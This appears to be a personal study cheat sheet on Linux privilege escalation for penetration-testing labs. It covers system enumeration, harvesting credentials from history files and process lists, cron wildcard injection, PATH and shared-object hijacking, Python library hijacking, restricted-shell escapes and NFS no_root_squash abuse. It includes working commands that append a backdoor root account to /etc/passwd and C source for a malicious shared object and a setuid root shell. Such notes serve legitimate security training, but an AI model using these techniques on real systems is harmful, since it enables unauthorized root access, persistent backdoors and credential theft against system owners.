---
layout: blank
pagetitle: Linux Privilege Escalation
---

[HTB Linux Privesc Checklist](https://khaelkugler.com/pdf/Linux_Privilege_Escalation_Module_Cheat_Sheet.pdf)

## Enumerating Linux

**Files and User Privileges**
- Each file has read, write, and execute
- Groups are owner, owner's group (/etc/group), and others (everybody else) group

**Manual Enumeration**
- Getting info about the system
	- Running `id` can tell use about the user context
	- Running `hostname` can give us, the, uh, hostname
	- Reading `/etc/issue` and `/etc/os-release` and `uname -a` can give us OS info for exploits
	- Explore processes with `ps aux`
	- Check out network adapters with `ip a` or `ifconfig`
		- Display routing tables with `route` or `routel` or `netstat -rn`
		- Check the arp table for recent connections with `arp -a` (same with `/etc/hosts`)
	- Display active connections with `netstat -anp` or `ss -anp` 
- Getting info on the firewall (without root user -> iptables)
	- Can sometimes read `/etc/iptables` 
	- Can search for `iptables-save` output in that directory, ending in .v4 I think
- Check cron jobs with `ls -lah /etc/cron*`
	- Has sections showing what is run at what intervals (e.g. hourly)
		- We can then check those folders to see what's running (e.g. `/etc/cron.hourly/`)
	- If we have sudo permissions ONLY for checking crontab, running `sudo crontab -l` will show scripts run by the root user
	- Can also check for running cron jobs with `grep "CRON" /var/log/syslog`
- Querying installed packages with `dpkg -l`
- Checking drives
	- `mount` will list all mounted filesystems
		- Can also `cat /etc/fstab` and grep for sensitive information
	- `lsblk` to list all available disks
	- `df -h` to list
- List attached printers with `lpstat`
- Check kernel modules with `lsmod`
	- To investigate certain modules, use `/sbin/modinfo {module_name}`

**Automated Enumeration**
- `linpeas`
	- `https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
- `unix-privesc-check`
	- Checks for misconfigurations that can be used for privescs
	- Located in kali at /usr/bin/unix-privesc-check
	- `./unix-privesc-check standard > output.txt`
- `LinEnum` - apparently a developed tool listed alongside `LinPeas`
- `pspy` - https://github.com/DominicBreuker/pspy
	- Use static 64bit version
	- Checks for commands being executed on the host
	- Finds scripts
- `linux-exploit-suggester` (executed by linpeas)
	- https://github.com/jondonas/linux-exploit-suggester-2

## Exposed Confidential Information

**Checking User History Files**
- `.bashrc` can sometimes contains environment variables with credentials
- `echo $HISTFILE`
- Can check environment variables with `env`

**Inspecting User/System Trails for Credentials**
- Can use `watch -n 1`sudo to run something like `ps -aux | grep "pass"` to look for new processes spawned with "pass" somewhere in the command
- If TCPdump sudo permissions have already been given to us, we can use it to monitor network traffic, which isn't normally allowed
	- `sudo tcpdump -i lo -A | grep "pass"`

**Searching for interesting files**
- Many times, especially on engagements, there will be custom scripts everywhere
  - These can have credentials or generally important system information, like accessing a local service
- Search for these with `find . -name '*.sh' 2>/dev/null` (or `.py`, `.pl`, etc.)
  - To exclude directories, use `-not -path '{path}/*'`
    - For example, `find / -name '*.sh' -not -path '/snap/*' -not -path '/usr/src/linux*' 2>/dev/null`

## Insecure File Permissions

**Abusing Insecure Cron Jobs/File Permissions**
- Checking for running cron jobs
	- `ls -lah /etc/cron*`
	- `grep "CRON" /var/log/syslog`
	- check `/var/log/cron.log`
	- We can also abuse wildcards
		- For example, if there's a cron job taking the tar of the current directory with `tar -zcf {output_file} *`, we can name a file `--checkpoint=1 --checkpoint-action=exec={command_or_script}`, which would get appended onto the tar command due to the wildcard
- Find modifiable cron jobs and overwrite them with anything, really
- Find writable directories with `find / -writable -type d 2>/dev/null`
- Find writable files with `find / -writable -type f 2>/dev/null`
- Find readable files with `find /home -readable -type f 2>/dev/null`

**Abusing Password Authentication**
- `/etc/passwd` is considered valid for auth, even with existence of `/etc/shadow`, meaning that if we can write to `/etc/passwd` we can just set an arbitrary password for a user
	- Generate a new password with `openssl passwd {passwd}`, which returns crypt algo hash
	- Then, create a new user with that hash as their password in the following format:
		- `echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd` (creates new `root2`/`w00t` user)

## Abusing System Linux Components

**PATH Abuse**
- If we can write executables to PATH (linpeas will let us know if we can), we can replace common binaries with our custom malicious ones
- For example, if we can write to `/usr/sbin`, we could add a file there called `cat` with `echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd` inside
	- Since `/usr/sbin` comes first in `$PATH` (and is shared among users), scripts run by root that call `cat` would run our binary
	- These can be startup scripts or application scripts, we just need root to run it

**SetUID/SetGID**
- Linpeas will check for `setuid` and `setgid` executables
- These binaries can be executed by users with the rights of the owner or owner's group
	- Thus, getting commands through one of these executables allows privesc
	- Search for these files with `find / -perm -u=s -type f 2>/dev/null`
		- Then, check if abusable with GTFO bins
- Scripts, like bash/python scripts, *can* have the suid bit, but will not execute as root until manually setting the UID to 0
	- For example, if a python script has the setuid bit, it will need to `os.setuid(0)` before anything is run as root
		- This is done for safety reasons due to a kernel race conditionw with loading and execution scripts
	- However, after these scripts elevate their privileges, we can modify our own path such that ANY binaries are ours
		- `echo "echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd" > /tmp/cat` (replace cat with target binary)
		- `chmod +x /tmp/cat`
		- `export PATH=/tmp:$PATH` (placing `/tmp` at the front so our "binaries" come first)
		- Then, just run the script. After privileges are elevated and any of our binaries are called, we'll get the user added to `/etc/passwd`

**Abuse Capabilities**
- Capabilities provide fine-grain privilege granting to processes
	- Can use `cap_setuid`, `cap_setgid`, `cap_sys_admin`, or `cap_dac_override` to gain root privileges
- Enumerate for binaries with capabilities (fine-grain executable powers)
	- `getcap -r / 2>/dev/null`
		- Might need to specify the full path at `/usr/sbin/getcap`
- Then check GTFOBins for UNIX binaries that can be misused for privesc
	- For example, perhaps we have a binary (`vim`) with file read permissions (`cap_dac_override`) - we could use it to read a root-level file

**Circumvent Special Sudo Permissions**
- `sudo -l` to see allowed commands
- "AppArmor" is a kernel module providing Mandatory Access Control; can prevent privesc
- Search up all sudo binaries in GTFOBins to see if they can be abused 

**Enumerate Kernel for CVEs**
- Get kernel info with `cat /etc/issue`, `uname -r`, and `arch`
- Then, use `searchsploit` to search for existing kernel exploits
	- `searchsploit "linux kernel {kernel type and version} Local Privilege Escalation"` and then grep for the version needed
		- `grep "4." | grep -v " < 4.4.4" | grep -v "4.8"`

**Shared Object Hijacking**
- Basically the linux equivalent of DLL hijacking
- If we see that a custom suid/sudo binary is using a custom library, we can specify it ourselves by putting it in the executable's `RUNPATH`, which is given loading priority
	- `readelf -d {binary} | grep PATH` will tell us the runpath of the binary
- If we can write to the `RUNPATH`, we can compile a malicious `.so` file to be used by the binary in place of a custom `.so` file
- Use `ldd` to figure out which shared objects are in use (as well as their paths)
	- `ldd {executable_name}`
- Can compile the code below into an so file with `gcc {c_code_file} -fPIC -shared -o {output_so_file}` and move the file to the correct location

```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    setuid(0);
    system("echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd");
} 
```
- Now running the initial binary should result in the malicious shared object being executed

**Python Library Hijacking**
- If we have a suid python script, we can sometimes take over the libraries in use
- Option 1: Write permissions
	- If we can write to the library's python code itself, we can pretty easily add `import os; os.system('{command}')` to the function name
	- For example, if we see that `psutil` is imported and the `virtual_memory()` function is used, we can run `grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*` and locate where the function itself is called, adding our line to the top of the function
- Option 2: Library Paths
	- If we have write permissions to a library path that is earlier than the library path that our script is importing, we can beat it to the punch
	- Use `python3 -c 'import sys; print("\n".join(sys.path))'` to see the in-order priority list of library locations
	- We can then add the library as `{library_name}.py` to a higher directory, with a function inside that runs `import os; os.system('{command}')`
- Option 3: Environment Variables
	- If we have `SETENV` for `/usr/bin/python3` in `/etc/sudoers`, we can define the location to import modules from
	- We can then just run `PYTHONPATH=/tmp/ python3 ./{script}` with our malicious library and function, same as above
		- This format just sets the environment variable's scope to the single command (as the first parameter)

## Escaping Restricted Shells

- Great resource: [https://0xffsec.com/handbook/shells/restricted-shells/](https://0xffsec.com/handbook/shells/restricted-shells/)

**Common Restricted Shells**
- Rbash - restricted Bourne shell (sh)
  - Can't change directories, set/modify env vars, or execute commands in other directories
- Rksh - restricted Korn shell
  - Similar as above, can't cd, set/modify env, or exec commands in other directories
- Rzsh - restricted Z shell
  - Can't run scripts, defining aliases, and modifying env

**Command Injection**
- Using `$()` or `` ` `` to simply execute commands
- Can also try doing something like `ls -l ${cmd}`
- Using shell metacharacters to specify multiple commands, for example `ls;whoami` or `ls|whoami`

**Modifying Environment Variables**
- If some custom command uses an environment variable, we can modify it to gain full command execution
- Alternatively, we can sometimes change our directory of execution via specifying a different directory in an environment variable
	- If we can't see the environment variables, try echoing `$0` or `$PATH` directly

**Shell Functions**
- Create a function like `function asdf() { /bin/bash; }`, and then run `asdf`

**Reading files**
- Sometimes, the best we can do is reading files
- We can see which commands we have by checking our PATH and seeing what commands we have at our disposal
  - Alternatively, we can run something like `help` or `compgen -c` to see what we have
- Then, use GTFObins or searching up online to see how we can abuse
  - For example, if we have man, we can do `man -C {file}` to set the contents of the file as man config, which man will error out on
  - This will inadvertently show where in the file contents the error is, allowing us to read the file

## Miscellaneous

**No Root Squash Abuse**
- Having root squash enabled for an NFS volume means that if root connects, the user is changed to `nfsnobody`, which is unprivileged
	- Missing this check is a security issue
- Exploitation steps:
	- Create suid binary that executes `/bin/sh` on kali machine

	```
	#include <stdio.h>
	#include <sys/types.h>
	#include <unistd.h>
	#include <stdlib.h>

	int main(void)
	{
	setuid(0); setgid(0); system("/bin/bash");
	}
	```

  - Mount `/mnt` to `/tmp` on the target server's NFS - `sudo mount -t nfs {target}:/tmp /mnt`
  - Copy the file to `/tmp` directory on the NFS server - `cp {binary_name} /mnt`
  - Set the SUID bit - `chmod u+s /mnt/{binary_name}`
  - Swtich back to the low priv user session and execute to gain a shell



**What to do once you have root?**
- Look around the filesystem for passwords
	- `/etc/shadow` for hashes
	- Application config files 
	- Log files (like apache)
	- All users' home directories for interesting files/bash history